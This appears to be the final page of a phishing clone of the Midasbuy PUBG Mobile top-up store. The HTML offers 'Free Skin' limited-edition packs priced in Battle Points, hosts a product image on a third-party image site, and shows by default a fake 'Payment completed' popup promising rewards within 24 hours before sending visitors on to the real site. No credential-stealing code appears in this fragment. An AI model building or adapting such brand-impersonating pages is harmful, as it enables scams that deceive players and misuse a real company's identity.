            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_Elite_Pass_Plus_Package" class="price">23.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_RP_Upgrade_Card_Package" data-pid="S19_RP_Upgrade_Card_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/5.png" data-original="../img/rewards/5.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_RP_Upgrade_Card_Package" class="price">27.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_Elite_Pass_Plus_Package" data-pid="S19_Elite_Pass_Plus_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/6.png" data-original="../img/rewards/6.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_Elite_Pass_Plus_Package" class="price">30.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_RP_Upgrade_Card_Package" data-pid="S19_RP_Upgrade_Card_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/7.png" data-original="../img/rewards/7.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_RP_Upgrade_Card_Package" class="price">34.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_Elite_Pass_Plus_Package" data-pid="S19_Elite_Pass_Plus_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/8.png" data-original="../img/rewards/8.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_Elite_Pass_Plus_Package" class="price">41.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_RP_Upgrade_Card_Package" data-pid="S19_RP_Upgrade_Card_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/9.png" data-original="../img/rewards/9.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_RP_Upgrade_Card_Package" class="price">46.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_Elite_Pass_Plus_Package" data-pid="S19_Elite_Pass_Plus_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/10.png" data-original="../img/rewards/10.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_Elite_Pass_Plus_Package" class="price">700.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_RP_Upgrade_Card_Package" data-pid="S19_RP_Upgrade_Card_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/11.png" data-original="../img/rewards/11.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_RP_Upgrade_Card_Package" class="price">1.000.000 BP
                    <!---->
                </p>
            </div>
        </li>
    </ul>
</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	
	<div class="pop-mode-box" style="display: block;">
                <div class="pop-mode" style="display: block;">
                    <div class="mess have-desc">
                        <p class="warn-icon"> Payment completed</p>
                    </div>
                    <div class="desc min-desc">
                        <p>Payment for the exchange of Battle Points for your account is being processed</p>
						<br>
                        <p>Please wait up to 24 hours, the reward will be sent to your account via in-game mail box</p>
                    </div>
                    <div class="btn-wrap">
                        <div class="btn" onclick="location.href='https://www.midasbuy.com';">OK</div>
                    </div>
                </div>
            </div>
			
    <div class="footer" style="">
        <div class="main">
            <div class="t">
                <div class="left">

                    <p class="label">Follow us on</p>
                    <div class="p-box g-clr">
                        <div class="box">

                            <div class="on-list">
                                <a>
                                    <img class="default" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb.png" alt="img" />
                                    <img class="hover" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb-hover.png" alt="img" />
                                </a>
                            </div>

                            <div class="on-list">
                                <a>
                                    <img class="default" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-twitter.png" alt="img" />
                                    <img class="hover" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-twitter-hover.png" alt="img" />
                                </a>
                            </div>

                            <div class="on-list">
                                <a>
                                    <img class="default" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-ins.png" alt="img" />
                                    <img class="hover" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-ins-hover.png" alt="img" />
                                </a>
                            </div>

                            <div class="on-list">
                                <a>
                                    <img class="default" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-youtube.png" alt="img" />
                                    <img class="hover" src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-youtube-hover.png" alt="img" />
                                </a>
                            </div>

                        </div>
                    </div>

                </div>
                <div class="right">
                    <p class="label">

                    </p>
                    <div class="p-box g-clr">
                        <div class="box">
                            <p class="p">
                                For customer service
                            </p>
                            <p class="p">
                                Please send email to help@midasbuy.com
                            </p>
                        </div>

                        <a class="feeedback">
                            Feedback
                        </a>


                    </div>
                </div>
            </div>
            <div class="b">
                <ul class="link">
                    <li><a href="javascript:;" class="cookie-agreement" id="cookieBtn">
                            Cookie Perferences
                        </a></li>
                    <li><a>
                            Terms of Service
                        </a></li>
                    <li><a>
                            Privacy Policy
                        </a></li>
                </ul>
                <p class="copying">
                    COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.
                </p>
            </div>
        </div>
    </div>
    <div class="record-detailt-pop cookie-agreement-pop" id="cookie-agreement-pop">
        <div class="pop-title clear-border">
            <p>YOUR COOKIE PREFERENCES</p>
        </div>
        <div class="detailt-box">
            <div class="block">
                <div class="block-title">
                    <p></p>
                </div>
                <p class="block-desc"></p>
            </div>
            <p class="txt-one">
                We use cookies that are necessary to provide the service and also other cookies, including third-party cookies for performance and analysis. For more information on our cookie policy, please click here. </p>
            <div class="block">
                <div class="block-title">
                    <p>Necessary Cookies</p>
                </div>
                <p class="block-desc">These cookies are necessary to provide you with the service and to use some of its features, such as to facilitate transactions.</p>
            </div>
            <div class="block">
                <div class="block-title">
                    <p>Analytics Cookies</p>
                    <div class="switch-box">
                        <span id="gaStatus"></span>
                        <div class="switch-btn" id="cookieSwitchBtn">
                            <em></em>
                        </div>
                    </div>
                </div>
                <p class="block-desc">These cookies are used to measure and analyse how the service is accessed, used, or is performing in order to provide you with a better user experience and to maintain, operate and continually improve the service.</p>
            </div>
            <div class="block">
                <div class="block-title">
                    <p></p>
                </div>
                <p class="block-desc"></p>
            </div>
            <div class="block">
                <div class="block-title">
                    <p></p>
                </div>
                <p class="block-desc"></p>
            </div>
        </div>
        <div class="bottom-zz-bg">
            <div class="pop-btn" id="cookieCloseBtn">Save and close</div>
        </div>
    </div>

    <script>
        var devMode = false
        var autoReportConfig = {}
    </script>
    <script src="https://cdn.midasbuy.com/oversea_web/static/js/auto-report.umd.js"></script>
    <script src="https://cdn.midasbuy.com/oversea_web/static/js/footer.7825ada3.js"></script>

    <div class="pop-mod-bg"></div>
    <div class="visa-card-pat-face-pop" id="pop-box" style="display: none;">
        <div class="pop-content">
            <a href="#"></a>
            <div class="close-btn"></div>
        </div>
    </div>
    <script>
        window.productsList = [{
            "name": "Royale Pass Pack (Season 19)",
            "productid": "S19_RP_Upgrade_Card_Package",
            "product_detail": "",
            "price": "999",
            "num": "",
            "currency_type": "USD",
            "country": "OT",
            "unit": "3",
            "days": "",
            "autopaytype": "",
            "service_code": "-APPDJ75341",
            "tax_info_list": [],
            "proxy_tax_info_list": [],
            "original_price": "999",
            "tax_fee": "0",
            "begin_time": "1621216800",
            "end_time": "1626134399",
            "rank_num": "2",
            "is_hot_product": "0",
            "image_url": "https://i.ibb.co/njP48MD/Pics-Art-08-15-06-17-19.jpg",
            "description": "Please collect it from in-game mail.",
            "reserve_time": "",
            "sub_product": [{
                "name": "70UC",
                "image_url": "https://cdn.midasbuy.com/images/UC70%20_%EF%BC%88128_128%EF%BC%898f731152.png",
                "sub_productid": "70UC_new",
                "sub_product_count": "1",
                "description": ""
            }, {
                "name": "Royale Pass Upgrade Card (Season 19)",
                "image_url": "https://cdn.midasbuy.com/images/%E6%99%AE%E9%80%9A%E5%8D%A1%20_%EF%BC%88128x128%EF%BC%898e8bf882.png",
                "sub_productid": "Royale_Pass_Upgrade_Card_Season19",
                "sub_product_count": "1",
                "description": ""
            }],
            "limit": true,
            "unavailable": false,
            "timeleft": -1622311073,
            "startTime": -28800
        }, {
            "name": "Elite Pass Plus Pack (Season 19)",
            "productid": "S19_Elite_Pass_Plus_Package",
            "product_detail": "",
            "price": "2499",
            "num": "",
            "currency_type": "USD",
            "country": "OT",
            "unit": "3",
            "days": "",
            "autopaytype": "",
            "service_code": "-APPDJ75341",
            "tax_info_list": [],
            "proxy_tax_info_list": [],
            "original_price": "2499",
            "tax_fee": "0",
            "begin_time": "1621216800",
            "end_time": "1626134399",
            "rank_num": "7",
            "is_hot_product": "0",
            "image_url": "https://i.ibb.co/njP48MD/Pics-Art-08-15-06-17-19.jpg",
            "description": "Please collect it from in-game mail.",
            "reserve_time": "",
            "sub_product": [{
                "name": "Classic Crate Coupon",
                "image_url": "https://cdn.midasbuy.com/images/%E5%85%B8%E8%97%8F%E5%AE%9D%E7%AE%B1%20_%EF%BC%88128_128%EF%BC%8977c52ef7.png",
                "sub_productid": "Classic_Coupon_new",
                "sub_product_count": "1",
                "description": ""
            }, {
                "name": "Elite Pass Plus Upgrade Card (Season 19)",
                "image_url": "https://cdn.midasbuy.com/images/%E7%B2%BE%E8%8B%B1%E5%8D%A1%20_%EF%BC%88128x128%EF%BC%89df01251d.png",
                "sub_productid": "Elite_Pass_Plus_Card_Season19",
                "sub_product_count": "1",
                "description": ""
            }],
            "limit": true,
            "unavailable": false,
            "timeleft": -1622311073,
            "startTime": -28800
        }];
        window.MP_INFO = {};
        window.seasonCardPid = "S19_RP_Upgrade_Card_Package,S19_Elite_Pass_Plus_Package";
    </script>
    <script>
        //监听滚动停止
        var scrollT1 = 0;
        var scrollT2 = 0;
        var scrollTimer = null;
        var setPosition = function(isBottom) {
            if (isBottom) {
                if (setPosition.isBottom) {
                    return;
                }

                $('.pay-sec,.wrap').addClass('pay-sec-flex');
                $('.pay-sec').show();
                $('.footer').addClass('show').show();
                setPosition.isBottom = 1;

            } else {
                // if(!setPosition.isBottom){ return; }
                $('.pay-sec,.wrap').removeClass('pay-sec-flex');
                $('.footer').removeClass('show');
                setPosition.isBottom = 0;
            }
        }
        window.showClauseBg = function() {
            $('.clause-bg').show();
            $('.clause-box-pop').show();
        }
        window.hideClauseBg = function() {
            $('.clause-box-pop').hide();
            setTimeout(function() {
                $('.clause-bg').fadeOut();
            }, 100)
        }
        window.hideTaxPop = function() {
            $('.taxes-bg').fadeOut();
            $('.taxes-box-pop').fadeOut();
        }
        window.showBirthBox = function() {
            $('#birthBox').show();
            $('body').css({
                'overflow': 'hidden'
            });
        };

        window.hideBirthBox = function() {
            $('#birthBox').hide();
            $('body').css({
                'overflow': 'auto'
            });
        };

        function isScrollEnd() {
            scrollT2 = $(document).scrollTop();
            if (scrollT2 == scrollT1) {
                $('.follow').removeClass('scrollStar')
                clearTimeout(scrollTimer)
            }
        }
        $(function() {
            if ($(window).innerHeight() > $(document).height()) {
                setPosition(1);
            } else {
                $(window).on("scroll", throttle(function() {
                    var docHeight = $(document).height();
                    if ($('.wrap').hasClass('pay-sec-flex')) {
                        if ($(window).width() <= 768) {
                            docHeight = docHeight * 1 - 120;
                        } else {
                            docHeight = docHeight * 1 - 180;
                        }
                    }
                    var isBottom = Math.ceil($(window).scrollTop() + window.innerHeight) >= docHeight;
                    setPosition(isBottom);
                    // 移动端FB点赞处理
                    clearTimeout(scrollTimer)
                    $('.follow').addClass('scrollStar')
                    scrollTimer = setTimeout(isScrollEnd, 100)
                    scrollT1 = $(document).scrollTop()
                }, 200));
            }


            $('.clause-bg,.clause-box-pop .close').on('click', function() {
                window.hideClauseBg();
            });
        });
    </script>
    <script src="https://cdn.midasbuy.com/oversea_web/static/js/mallpage.3e0ab2cd.js"></script>
    <script type="text/javascript" src="https://cdn.midasbuy.com/oversea_web/static/js/jquery.lazyload.min.js?jslib=1"></script>
    <script>
        $('.game_list_new .list-box ul li .pic img.lazy').lazyload({
            placeholder: 'https://cdn.midasbuy.com/oversea_web/static/images/game_list_loading-8df54cb898.png',
            effect: 'fadeIn',
            event: 'scroll',
            container: $('.game_list .content'),
            failure_limit: 20,
            threshold: 1
        });
    </script>
    <script>
        $('.banner-wrap .nav-box li a').on('click', function() {
            $('.banner-wrap .nav-box li').removeClass('active')
            $(this).parent().addClass('active');
        })

        /* 道具列表页 - 查看更多道具 */

        $('.prop-block').each(function() {
            console.log($(this).find('.item').length)
            if ($(this).find('.item').length > 3) {
                $(this).parent().parent().parent().find('.item-box').addClass('scrollBar');
            }
        })

        $('.more-prop').on('click', function() {
            $('.prop-block').fadeOut();
            if ($(window).width() <= 768) {
                $(this).parent().find('.prop-block').fadeIn();
            } else {
                $(this).parent().find('.prop-block').fadeIn();
            }
        })

        $('.prop-block .z-bg,.prop-block .close').on('click', function() {
            $('.prop-block').fadeOut();
            return false;
        })

        $('.visa-card-pat-face-pop .close-btn').on('click', function() {
            $('.visa-card-pat-face-pop').fadeOut();
            isDiff = false;
        })
    </script>
    <script>
        report.view('mallv2');
        report.setPage('mallv2');
        report.performance('mallv2');
    </script>